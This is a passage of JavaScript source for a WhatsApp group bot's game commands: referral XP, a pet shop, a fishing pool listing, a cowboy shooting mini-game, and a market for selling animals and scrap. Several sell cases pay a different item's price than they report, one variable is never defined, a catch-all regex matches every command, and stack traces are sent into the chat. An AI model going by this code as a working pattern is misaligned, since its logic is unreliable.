const xp_link_creator = 15000
const xp_bonus = {
    5: 40000,
   10: 100000,
   20: 250000,
   50: 1000000,
  100: 10000000,
}

  let users = global.db.users
  if (text) {
    if ('ref_count' in users[m.sender]) throw 'Cannot use referral code!'
    let link_creator = (Object.entries(users).find(([, { ref_code }]) => ref_code === text.trim()) || [])[0]
    if (!link_creator) throw 'Invalid referral code'
    let count = users[link_creator].ref_count++
    let extra = xp_bonus[count] || 0
    users[link_creator].exp += xp_link_creator + extra
    users[m.sender].exp += xp_first_time
    users[m.sender].ref_count = 0
    m.reply(`
Congratulations!
+${xp_first_time} XP
`.trim())
    m.reply(`
Someone has used your referral code
+${xp_link_creator + extra} XP
`.trim(), link_creator)
  } else {
    let code = users[m.sender].ref_code = users[m.sender].ref_code || new Array(11).fill().map(() => [...'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'][crypto.randomInt(62)]).join('')
    users[m.sender].ref_count = users[m.sender].ref_count ? users[m.sender].ref_count : 0
    let command_text = `${command}ref ${code}`
    let command_link = `wa.me/${LordVoltageuser.jid.split('@')[0]}?text=${encodeURIComponent(command_text)}`
    let share_text = `
Get ${xp_first_time} XP for those who use the referral link/code below

Referal Code: *${code}*

${command_link}
`.trim()
    m.reply(`
Get ${xp_first_time} XP for those who use the referral link/code below
${users[m.sender].ref_count} people have used your referral code

Kode referal YOU: ${code}

Share the link with friends: ${command_link}

or send a message to a friend wa.me/?text=${encodeURIComponent(share_text)}

${Object.entries(xp_bonus).map(([count, xp]) => `${count} Orang = Bonus ${xp} XP`).join('\n')}
`.trim())
  }}
}
break
//==================================================================
case 'petstore': 
case 'petshop': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
  let type = (args[0] || '').toLowerCase()
  let _type = (args[0] || '').toLowerCase()
  let user = global.db.users[m.sender]
  global.db.users[m.sender].pickaxe = global.db.users[m.sender].pickaxe || 0
  global.db.users[m.sender].pedang = global.db.users[m.sender].pedang || 0
  global.db.users[m.sender].fishingrod = global.db.users[m.sender].fishingrod || 0
  
  //----------HARGA
  let hdog = 2
  let hcat = 2
  let hhorse = 4
  let hfox = 6
  let hrobo = 10
  
  let hlion = 10
  let hrhinoceros = 10
  let hdragon = 10
  let hcentaur = 10
  let hkyubi = 10
  let hgriffin = 10
  let hphonix = 10
  let hwolf = 10

let logo = `— *P E T   S T O R E* —
▮▧▧▧▧▧▧▧▧▧▧▧▧▮`
let caption = `
🐈 *Cat:* ${hcat} 🔖
🐕 *Dog:* ${hdog} 🔖
🐎 *Horse:* ${hhorse} 🔖
🦊 *Fox:* ${hfox} 🔖
🤖 *Robo:* ${hrobo} 🔖

〉 *ABILITY*
Cooming soon...`
const sections = [
   {
	title: "Buy A Pet",
	rows: [
	    {title: "Cat 🐈", rowId: ".petshop cat", description: "Adopt A Cat"},
	    {title: "Dog 🐕", rowId: ".petshop dog", description: "Adopt A Dog"},
	    {title: "Horse 🐎", rowId: ".petshop horse", description: "Adopt A Horse"},
	    {title: "Fox 🦊", rowId: ".petshop fox", description: "Adopt A Fox"},
	    {title: "Robo 🤖", rowId: ".petshop robo", description: "Buy A Robo"},
	]
    },
]

const listMessage = {
  text: caption,
  footer: wm,
  title: logo,
  buttonText: "ADOPT ME 🐾",
  sections
}

  try {
    if (/petshop/i.test(command)) {
      const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
        switch (type) {
          case 'cat':
          if (user.cat > 0) return m.reply('You already have this')
            if(user.pet < hcat) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hcat
            global.db.users[m.sender].cat += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
          case 'dog':
          if (user.dog > 0) return m.reply('You already have this')
            if(user.pet < hdog) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hdog
            global.db.users[m.sender].dog += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
          case 'fox':
          if (user.fox > 0) return m.reply('You already have this')
            if(user.pet < hfox) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hfox
            global.db.users[m.sender].fox += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
          case 'horse':
          if (user.horse > 0) return m.reply('You already have this')
            if(user.pet < hhorse) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hhorse
            global.db.users[m.sender].horse += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
          case 'robo':
          if (user.robo > 0) return m.reply('You already have this')
            if(user.pet < hrobo) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hrobo
            global.db.users[m.sender].robo += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'lion':
          if (user.lion > 0) return m.reply('You already have this')
            if(user.pet < hlion) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hlion
            global.db.users[m.sender].lion += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'rhinoceros':
          if (user.rhinoceros > 0) return m.reply('You already have this')
            if(user.pet < hrhinoceros) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hrhinoceros
            global.db.users[m.sender].rhinoceros += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'dragon':
          if (user.dragon > 0) return m.reply('You already have this')
            if(user.pet < hdragon) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hdragon
            global.db.users[m.sender].dragon += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'centaur':
          if (user.centaur > 0) return m.reply('You already have this')
            if(user.pet < hcentaur) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hcentaur
            global.db.users[m.sender].centaur += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'kyubi':
          if (user.kyubi > 0) return m.reply('You already have this')
            if(user.pet < hkyubi) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hkyubi
            global.db.users[m.sender].kyubi += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'griffin':
          if (user.griffin > 0) return m.reply('You already have this')
            if(user.pet < hgriffin) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hgriffin
            global.db.users[m.sender].griffin += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'phonix':
          if (user.phonix > 0) return m.reply('You already have this')
            if(user.pet < hphonix) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hphonix
            global.db.users[m.sender].phonix += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            case 'wolf':
          if (user.wolf > 0) return m.reply('You already have this')
            if(user.pet < hwolf) return m.reply(`Your Pet Token is low`)
            global.db.users[m.sender].pet -= hwolf
            global.db.users[m.sender].wolf += 1
            m.reply("Congratulations on having a new pet! 🎉")
            break
            
          default:
              return await m.reply(`${logo}\n${caption}`)
            //return await conn.sendMessage(m.chat, listMessage)
        }
    } else if (/enchant|enchan/i.test(command)) {
      const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
      switch (_type) {
        case 't':
          break
        case '':
          break

        default:
          return LordVoltage.sendButton( m.chat, caption, wm, null, [`⋮☰ Menu`, `.menu`], m)
      }
    }
  } catch (err) {
    m.reply("Error\n\n\n" + err.stack)
  }
  }}
  break
//==================================================================
case 'kolam':
case 'pool': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
let user = global.db.users[m.sender]
let past = `
╭━━━━「 *BIO* 」   
┊ *💌 Name :* ${user.registered ? user.name : LordVoltage.getName(m.sender)}
┊ *📊 Level :* ${user.level}
┊ *🙂 Exp :* ${user.exp}
╰═┅═━––––––─ׄ✧

╭━━━━「 *ISI* 」
┊🦀 Crab: ${user.kepiting}
┊🦞 Lobster: ${user.lobster}
┊🦐 Udang: ${user.udang}
┊🦑 Cumi: ${user.cumi}
┊🐙 Gurita: ${user.gurita}
┊🐡 Buntal: ${user.buntal}
┊🐠 Dory: ${user.dory}
┊🐳 Orca: ${user.orca}
┊🐬 Lumba: ${user.lumba}
┊🐋 Paus: ${user.paus}
┊🦈 Hiu: ${user.hiu}
╰═┅═━––––––─ׄ✧
🎏 Total Isi: *${user.kepiting + user.lobster + user.udang + user.cumi + user.gurita + user.buntal + user.dory + user.orca + user.lumba + user.paus + user.hiu}* Jenis`
  m.reply(past)
  }}
break
//==================================================================
case 'koboy':
case 'cowboy': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function random(arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}
	try {
  LordVoltage.tembak = LordVoltage.tembak || { musuh: [], tembak: [] }
   if(/kiri/i.test(text)) {

    let kiri = [
      ["🤠", "-", "-", "-", "-"],
      ["-", "🤠", "-", "-", "-"],
      ["-", "-", "🤠", "-", "-"],
      ["-", "-", "-", "🤠", "-"],
      ["-", "-", "-", "-", "🤠"]
    ]

    if(LordVoltage.tembak.tembak.indexOf("🤠") == 0) {
      LordVoltage.tembak.tembak = kiri[0]
    } else if(LordVoltage.tembak.tembak.indexOf("🤠") == 1) {
      LordVoltage.tembak.tembak = kiri[0]
    } else if(LordVoltage.tembak.tembak.indexOf("🤠") == 2) {
      LordVoltage.tembak.tembak = kiri[1]
    } else if(LordVoltage.tembak.tembak.indexOf("🤠") == 3) {
      LordVoltage.tembak.tembak = kiri[2]
    } else if(LordVoltage.tembak.tembak.indexOf("🤠") == 4) {
      LordVoltage.tembak.tembak = kiri[3]
    }

    let pos = LordVoltage.tembak.musuh.join(" ") + "\n\n\n" + LordVoltage.tembak.tembak.join(" ")



    if(LordVoltage.tembak.musuh.indexOf("🥷") === LordVoltage.tembak.tembak.indexOf("🤠")) return LordVoltage.sendButton(m.chat, pos, wm, [
                                                                                              ['Tembak', `${command}shooting cowboy`]             
                                                                                              ])
    return LordVoltage.sendButton(m.chat, pos, wm, [
          ['←', `${command}koboy kiri`], ['→', `${command}right cowboy`]
])
  } else if(/kanan/i.test(text)) {

    let kanan = [
      ["🤠", "-", "-", "-", "-"],
      ["-", "🤠", "-", "-", "-"],
      ["-", "-", "🤠", "-", "-"],
      ["-", "-", "-", "🤠", "-"],
      ["-", "-", "-", "-", "🤠"]
    ]

    if(LordVoltage.tembak.tembak.indexOf("🤠") == 0) {
      LordVoltage.tembak.tembak = kanan[1]
    } else if(LordVoltage.tembak.tembak.indexOf("🤠") == 1) {
      LordVoltage.tembak.tembak = kanan[2]
    } else if(LordVoltage.tembak.tembak.indexOf("🤠") == 2) {
      LordVoltage.tembak.tembak = kanan[3]
    } else if(LordVoltage.tembak.tembak.indexOf("🤠") == 3) {
      LordVoltage.tembak.tembak = kanan[4]
    } else if(LordVoltage.tembak.tembak.indexOf("🤠") == 4) {
      LordVoltage.tembak.tembak = kanan[4]
    }

    let pos = LordVoltage.tembak.musuh.join(" ") + "\n\n\n" + LordVoltage.tembak.tembak.join(" ")



    if(LordVoltage.tembak.musuh.indexOf("🥷") === LordVoltage.tembak.tembak.indexOf("🤠")) return LordVoltage.sendButton(m.chat, pos, wm, [
                                                                                              ['Tembak', `${command}shooting cowboy`]             
                                                                                              ])             
    return LordVoltage.sendButton(m.chat, pos, wm, [
          ['←', `${command}koboy kiri`], ['→', `${command}right cowboy`]
])
  } else if(/tembak/i.test(text)) {

    if(LordVoltage.tembak.tembak.indexOf("🤠") == LordVoltage.tembak.musuh.indexOf("🥷")) {
      LordVoltage.tembak = {}
      global.db.users[m.sender].money += 1000
      m.reply("You win!\n\nMoney += 1000")
    }

  } else {
   let randMusuh = [
      ["🥷", "-", "-", "-", "-"],
      ["-", "🥷", "-", "-", "-"],
      ["-", "-", "🥷", "-", "-"],
      ["-", "-", "-", "🥷", "-"],
      ["-", "-", "-", "-", "🥷"]
    ]
   let randAku = [
      ["🤠", "-", "-", "-", "-"],
      ["-", "🤠", "-", "-", "-"],
      ["-", "-", "🤠", "-", "-"],
      ["-", "-", "-", "🤠", "-"],
      ["-", "-", "-", "-", "🤠"]
    ]

    let musuh = random(randMusuh)
   let aku = random(randAku)

    LordVoltage.tembak.musuh = musuh
    LordVoltage.tembak.tembak = aku

    let pos = LordVoltage.tembak.musuh.join(" ") + "\n\n\n" + LordVoltage.tembak.tembak.join(" ")

    if(LordVoltage.tembak.musuh.indexOf("🥷") === LordVoltage.tembak.tembak.indexOf("🤠")) return LordVoltage.sendButton(m.chat, pos, wm, [
                                                                                              ['Tembak', `${command}koboy tembak`]             
                                                                                              ])
    return LordVoltage.sendButton(m.chat, pos, wm, [
          ['←', `${command}koboy kiri`], ['→', `${command}koboy kanan`]
])
  }
  } catch (e) {
  	throw false
  }
}}
break
//==================================================================
case 'pasar':
case 'market': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
const Skepiting = 7000
const Slobster = 7000
const Sudang = 7000
const Scumi = 7000
const Sgurita = 7000
const Sbuntal = 7000
const Sdory = 7000
const Sorca = 7000
const Slumba = 7000
const Spaus = 7000
const Sikan = 7000
const Shiu = 7000
const Sbanteng = 9000
const Sharimau = 9000
const Sgajah = 9000
const Skambing = 9000
const Spanda = 9000
const Sbuaya = 9000
const Skerbau = 9000
const Ssapi= 9000
const Smonyet = 9000
const Sbabihutan = 9000
const Sbabi = 9000
const Sayam = 9000
const Sbotol = 100
const Skardus = 100
const Skaleng = 100
const Sgelas = 100
const Splastik = 100

    const _armor = global.db.users[m.sender].armor
    const armor = (_armor == 0 ? 20000 : '' || _armor == 1 ? 49999 : '' || _armor == 2 ? 99999 : '' || _armor == 3 ? 149999 : '' || _armor == 4 ? 299999 : '')
    let type = (args[0] || '').toLowerCase()
    let _type = (args[1] || '').toLowerCase()
    let jualbeli = (args[0] || '').toLowerCase()
    const Kchat = `╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
*🛒 Marine Animals | 💲 Selling Price*\n═┅═━––––––━––––––๑
🦀 Crab: ${Skepiting}
🦞 Lobster: ${Slobster}
🦐 Shrimp: ${Sudang}
🦑 Squid: ${Scumi}
🐙 Octopus: ${Sgurita}
🐡 Bloated: ${Sbuntal}
🐠 Dory: ${Sdory}
🐳 Orca: ${Sorca}
🐬 Racing: ${Slumba}
🐋 Pope: ${Spaus}
?? Shark: ${Shiu}
╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
*🛒 Land Animals | 💲 Selling Price*\n═┅═━––––––━––––––๑
🐃 Bull: ${Sbanteng}
🐅 Tiger: ${Sharimau}
🐘 Elephant: ${Sgajah}
🐐 Goat: ${Skambing}
🐼 Panda: ${Spanda}
🐃 Buffalo: ${Skerbau}
🐊 Crocodile: ${Sbuaya}
🐂 Cow: ${Ssapi}
🐒 Monkey: ${Smonyet}
🐗 Wild boar: ${Sbabihutan}
🐖 Pig: ${Sbabi}
🐔 Chicken: ${Sayam}
╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
📌 *Usage example :*\n═┅═━––––––━––––––๑
#market selling chickens [Number]
`.trim()
    try {
        if (/pasar|toko/i.test(command)) {
            const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
            const sampah = global.db.users[m.sender].sampah
            switch (jualbeli) {

            case 'jual': 
                switch (_type) {                  
                     case 'banteng':
                        if (global.db.users[m.sender].banteng >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].banteng -= count * 1
                            reply( `Sukses Menjual ${count} Banteng Dengan Harga ${Sbanteng * count} Money `.trim())
                        } else reply( `Banteng you are not enough`.trim())
                        break
                        case 'harimau':
                        if (global.db.users[m.sender].harimau >= count * 1) {
                            global.db.users[m.sender].money += Sharimau * count
                            global.db.users[m.sender].harimau -= count * 1
                            reply( `Sukses Menjual ${count} Harimau Dengan Harga ${Sharimau * count} Money `.trim())
                        } else reply( `Harimau you are not enough`.trim())
                        break
                        case 'gajah':
                        if (global.db.users[m.sender].gajah >= count * 1) {
                            global.db.users[m.sender].money += Sgajah * count
                            global.db.users[m.sender].gajah -= count * 1
                            reply( `Sukses Menjual ${count} Gajah Dengan Harga ${Sgajah * count} Money `.trim())
                        } else reply( `Gajah you are not enough`.trim())
                        break
                        case 'kambing':
                        if (global.db.users[m.sender].kambing >= count * 1) {
                            global.db.users[m.sender].money += Skambing * count
                            global.db.users[m.sender].kambing -= count * 1
                            reply( `Sukses Menjual ${count} Kambing Dengan Harga ${Skambing * count} Money `.trim())
                        } else reply( `Kambing you are not enough`.trim())
                        break
                        case 'panda':
                        if (global.db.users[m.sender].panda >= count * 1) {
                            global.db.users[m.sender].money += Spanda * count
                            global.db.users[m.sender].panda -= count * 1
                            reply( `Sukses Menjual ${count} Panda Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Panda you are not enough`.trim())
                        break
                        case 'buaya':
                        if (global.db.users[m.sender].buaya >= count * 1) {
                            global.db.users[m.sender].money += Sbuaya * count
                            global.db.users[m.sender].buaya -= count * 1
                            reply( `Sukses Menjual ${count} Buaya Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Buaya you are not enough`.trim())
                        break
                        case 'kerbau':
                        if (global.db.users[m.sender].kerbau >= count * 1) {
                            global.db.users[m.sender].money += Skerbau * count
                            global.db.users[m.sender].kerbau -= count * 1
                            reply( `Sukses Menjual ${count} Kerbau Dengan Harga ${Skerbau * count} Money `.trim())
                        } else reply( `Kerbau you are not enough`.trim())
                        break
                        case 'sapi':
                        if (global.db.users[m.sender].sapi >= count * 1) {
                            global.db.users[m.sender].money += Ssapi * count
                            global.db.users[m.sender].sapi -= count * 1
                            reply( `Sukses Menjual ${count} Sapi Dengan Harga ${Ssapi * count} Money `.trim())
                        } else reply( `Sapi you are not enough`.trim())
                        break
                        case 'monyet':
                        if (global.db.users[m.sender].monyet >= count * 1) {
                            global.db.users[m.sender].money += Smonyet * count
                            global.db.users[m.sender].monyet -= count * 1
                            reply( `Sukses Menjual ${count} Monyet Dengan Harga ${Smonyet * count} Money `.trim())
                        } else reply( `Monyet you are not enough`.trim())
                        break
                        case 'babi':
                        if (global.db.users[m.sender].babi >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].babi -= count * 1
                            reply( `Sukses Menjual ${count} Babi Dengan Harga ${Sbabi * count} Money `.trim())
                        } else reply( `Babi you are not enough`.trim())
                        break
                        case 'babihutan':
                        if (global.db.users[m.sender].babihutan >= count * 1) {
                            global.db.users[m.sender].money += Sbabihutan * count
                            global.db.users[m.sender].babihutan -= count * 1
                            reply( `Sukses Menjual ${count} Babi Hutan Dengan Harga ${Sbabihutan * count} Money `.trim())
                        } else reply( `Babi Hutan you are not enough`.trim())
                        break
                        case 'ayam':
                        if (global.db.users[m.sender].ayam >= count * 1) {
                            global.db.users[m.sender].money += Sayam * count
                            global.db.users[m.sender].ayam -= count * 1
                            reply( `Sukses Menjual ${count} Ayam Dengan Harga ${Sayam * count} Money `.trim())
                        } else reply( `Ayam you are not enough`.trim())
                        break
                        //mancing
                        case 'kepiting':
                        if (global.db.users[m.sender].kepiting >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].kepiting -= count * 1
                            reply( `Sukses Menjual ${count} Kepiting Dengan Harga ${Skepiting * count} Money `.trim())
                        } else reply( `Kepiting you are not enough`.trim())
                        break
                        case 'ikan':
                        if (global.db.users[m.sender].ikan >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].ikan -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dengan Harga ${Sikan * count} Money `.trim())
                        } else reply( `Ikan you are not enough`.trim())
                        break
                        case 'dory':
                        if (global.db.users[m.sender].dory >= count * 1) {
                            global.db.users[m.sender].money += Sdory * count
                            global.db.users[m.sender].dory -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dory Dengan Harga ${Sdory * count} Money `.trim())
                        } else reply( `Ikan Dory you are not enough`.trim())
                        break
                        case 'gurita':
                        if (global.db.users[m.sender].gurita >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].gurita -= count * 1
                            reply( `Sukses Menjual ${count} Gurita Dengan Harga ${Sgurita * count} Money `.trim())
                        } else reply( `Gurita you are not enough`.trim())
                        break
                        case 'buntal':
                        if (global.db.users[m.sender].buntal >= count * 1) {
                            global.db.users[m.sender].money += Sbuntal * count
                            global.db.users[m.sender].buntal -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${Sbuntal * count} Money `.trim())
                        } else reply( `Ikan Buntal you are not enough`.trim())
                        break
                        case 'hiu':
                        if (global.db.users[m.sender].hiu >= count * 1) {
                            global.db.users[m.sender].money += Shiu * count
                            global.db.users[m.sender].hiu -= count * 1
                            reply( `Sukses Menjual ${count} Hiu Dengan Harga ${Shiu * count} Money `.trim())
                        } else reply( `Hiu you are not enough`.trim())
                        break
                        case 'orca':
                        if (global.db.users[m.sender].orca >= count * 1) {
                            global.db.users[m.sender].money += Sorca * count
                            global.db.users[m.sender].orca -= count * 1
                            reply( `Sukses Menjual ${count} Paus Orca Dengan Harga ${Sorca * count} Money `.trim())
                        } else reply( `Paus Orca you are not enough`.trim())
                        break
                        case 'lumba':
                        if (global.db.users[m.sender].lumba >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].lumba -= count * 1
                            reply( `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${Slumba * count} Money `.trim())
                        } else reply( `Lumba Lumba you are not enough`.trim())
                        break
                        case 'paus':
                        if (global.db.users[m.sender].paus >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].paus -= count * 1
                            reply( `Sukses Menjual ${count} Paus Dengan Harga ${Spaus * count} Money `.trim())
                        } else reply( `Paus you are not enough`.trim())
                        break
                  case 'lobster':
                        if (global.db.users[m.sender].lobster >= count * 1) {
                            global.db.users[m.sender].money += Slobster * count
                            global.db.users[m.sender].lobster -= count * 1
                            reply( `Sukses Menjual ${count} Lobster Dengan Harga ${Slobster * count} Money `.trim())
                        } else reply( `Lobster you are not enough`.trim())
                        break
                     case 'udang':
                        if (global.db.users[m.sender].udang >= count * 1) {
                            global.db.users[m.sender].money += Sudang * count
                            global.db.users[m.sender].udang -= count * 1
                            reply( `Sukses Menjual ${count} Udang Dengan Harga ${Sudang * count} Money `.trim())
                        } else reply( `Udang you are not enough`.trim())
                        break
                      case 'cumi':
                        if (global.db.users[m.sender].cumi >= count * 1) {
                            global.db.users[m.sender].money += Scumi * count
                            global.db.users[m.sender].cumi -= count * 1
                            reply( `Sukses Menjual ${count} Cumi Dengan Harga ${Scumi * count} Money `.trim())
                        } else reply( `Cumi you are not enough`.trim())
                         break
                        case 'botol':
                        if (global.db.users[m.sender].botol >= count * 1) {
                            global.db.users[m.sender].money += Sbotol * count
                            global.db.users[m.sender].botol -= count * 1
                            reply( `Sukses Menjual ${count} Cumi Dengan Harga ${Sbotol * count} Money `.trim())
                        } else reply( `Botol you are not enough`.trim())
                        break
                        case 'kaleng':
                        if (global.db.users[m.sender].kaleng >= count * 1) {
                            global.db.users[m.sender].money += Skaleng * count
                            global.db.users[m.sender].kaleng -= count * 1
                            reply( `Sukses Menjual ${count} Kaleng Dengan Harga ${Skaleng * count} Money `.trim())
                        } else reply( `Kaleng you are not enough`.trim())
                        break
                        case 'kardus':
                        if (global.db.users[m.sender].kardus >= count * 1) {
                            global.db.users[m.sender].money += Skardus * count
                            global.db.users[m.sender].kardus -= count * 1
                            reply( `Sukses Menjual ${count} Kardus Dengan Harga ${Skardus * count} Money `.trim())
                        } else reply( `Kardus you are not enough`.trim())
                        break
                        case 'gelas':
                        if (global.db.users[m.sender].gelas >= count * 1) {
                            global.db.users[m.sender].money += Sgelas * count
                            global.db.users[m.sender].gelas -= count * 1
                            reply( `Sukses Menjual ${count} Gelas Dengan Harga ${Sgelas * count} Money `.trim())
                        } else reply( `Gelas you are not enough`.trim())
                        break
                        case 'plastik':
                        if (global.db.users[m.sender].plastik >= count * 1) {
                            global.db.users[m.sender].money += Splastik * count
                            global.db.users[m.sender].plastik -= count * 1
                            reply( `Sukses Menjual ${count} Plastik Dengan Harga ${Splastik * count} Money `.trim())
                        } else reply( `Plastik you are not enough`.trim())
                        break
                    default:
                        return m.reply(Kchat)
                }
                break
            default:
                return m.reply(Kchat)
            }

        } else if (/sell|jual|/i.test(command)) {
            const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
            switch (type) { 
                       case 'banteng':
                        if (global.db.users[m.sender].banteng >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].banteng -= count * 1
                            reply( `Sukses Menjual ${count} Banteng Dengan Harga ${Sbanteng * count} Money `.trim())
                        } else reply( `Banteng you are not enough`.trim())
                        break
                        case 'tiger':
                        if (global.db.users[m.sender].harimau >= count * 1) {
                            global.db.users[m.sender].money += Sharimau * count
                            global.db.users[m.sender].harimau -= count * 1
                            reply( `Successfully Selling ${count} Tigers At Price ${Sharimau * count} Money `.trim())
                        } else reply( `Harimau you are not enough`.trim())
                        break
                        case 'gajah':
                        if (global.db.users[m.sender].gajah >= count * 1) {
                            global.db.users[m.sender].money += Sgajah * count
                            global.db.users[m.sender].gajah -= count * 1
                            reply( `Sukses Menjual ${count} Gajah Dengan Harga ${Sgajah * count} Money `.trim())
                        } else reply( `Gajah you are not enough`.trim())
                        break
                        case 'kambing':
                        if (global.db.users[m.sender].kambing >= count * 1) {
                            global.db.users[m.sender].money += Skambing * count
                            global.db.users[m.sender].kambing -= count * 1
                            reply( `Sukses Menjual ${count} Kambing Dengan Harga ${Skambing * count} Money `.trim())
                        } else reply( `Kambing you are not enough`.trim())
                        break
                        case 'panda':
                        if (global.db.users[m.sender].panda >= count * 1) {
                            global.db.users[m.sender].money += Spanda * count
                            global.db.users[m.sender].panda -= count * 1
                            reply( `Sukses Menjual ${count} Panda Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Panda you are not enough`.trim())
                        break
                        case 'buaya':
                        if (global.db.users[m.sender].buaya >= count * 1) {
                            global.db.users[m.sender].money += Sbuaya * count
                            global.db.users[m.sender].buaya -= count * 1
                            reply( `Sukses Menjual ${count} Buaya Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Buaya you are not enough`.trim())
                        break
                        case 'kerbau':
                        if (global.db.users[m.sender].kerbau >= count * 1) {
                            global.db.users[m.sender].money += Skerbau * count
                            global.db.users[m.sender].kerbau -= count * 1
                            reply( `Sukses Menjual ${count} Kerbau Dengan Harga ${Skerbau * count} Money `.trim())
                        } else reply( `Kerbau you are not enough`.trim())
                        break
                        case 'sapi':
                        if (global.db.users[m.sender].sapi >= count * 1) {
                            global.db.users[m.sender].money += Ssapi * count
                            global.db.users[m.sender].sapi -= count * 1
                            reply( `Sukses Menjual ${count} Sapi Dengan Harga ${Ssapi * count} Money `.trim())
                        } else reply( `Sapi you are not enough`.trim())
                        break
                        case 'monyet':
                        if (global.db.users[m.sender].monyet >= count * 1) {
                            global.db.users[m.sender].money += Smonyet * count
                            global.db.users[m.sender].monyet -= count * 1
                            reply( `Sukses Menjual ${count} Monyet Dengan Harga ${Smonyet * count} Money `.trim())
                        } else reply( `Monyet you are not enough`.trim())
                        break
                        case 'babi':
                        if (global.db.users[m.sender].babi >= count * 1) {
                            global.db.users[m.sender].money += Sbabi * count
                            global.db.users[m.sender].babi -= count * 1
                            reply( `Sukses Menjual ${count} Babi Dengan Harga ${Sbabi * count} Money `.trim())
                        } else reply( `Babi you are not enough`.trim())
                        break
                        case 'babihutan':
                        if (global.db.users[m.sender].babihutan >= count * 1) {
                            global.db.users[m.sender].money += Sbabihutan * count
                            global.db.users[m.sender].babihutan -= count * 1
                            reply( `Sukses Menjual ${count} Babi Hutan Dengan Harga ${Sbabihutan * count} Money `.trim())
                        } else reply( `Babi Hutan you are not enough`.trim())
                        break
                        case 'ayam':
                        if (global.db.users[m.sender].ayam >= count * 1) {
                            global.db.users[m.sender].money += Sayam * count
                            global.db.users[m.sender].ayam -= count * 1
                            reply( `Sukses Menjual ${count} Ayam Dengan Harga ${Sayam * count} Money `.trim())
                        } else reply( `Ayam you are not enough`.trim())
                        break
                        //mancing
                        case 'kepiting':
                        if (global.db.users[m.sender].kepiting >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].kepiting -= count * 1
                            reply( `Sukses Menjual ${count} Kepiting Dengan Harga ${Skepiting * count} Money `.trim())
                        } else reply( `Kepiting you are not enough`.trim())
                        break
                        case 'ikan':
                        if (global.db.users[m.sender].ikan >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].ikan -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dengan Harga ${Sikan * count} Money `.trim())
                        } else reply( `Ikan you are not enough`.trim())
                        break
                        case 'dory':
                        if (global.db.users[m.sender].dory >= count * 1) {
                            global.db.users[m.sender].money += Sdory * count
                            global.db.users[m.sender].dory -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dory Dengan Harga ${Sdory * count} Money `.trim())
                        } else reply( `Ikan Dory you are not enough`.trim())
                        break
                        case 'gurita':
                        if (global.db.users[m.sender].gurita >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].gurita -= count * 1
                            reply( `Sukses Menjual ${count} Gurita Dengan Harga ${Sgurita * count} Money `.trim())
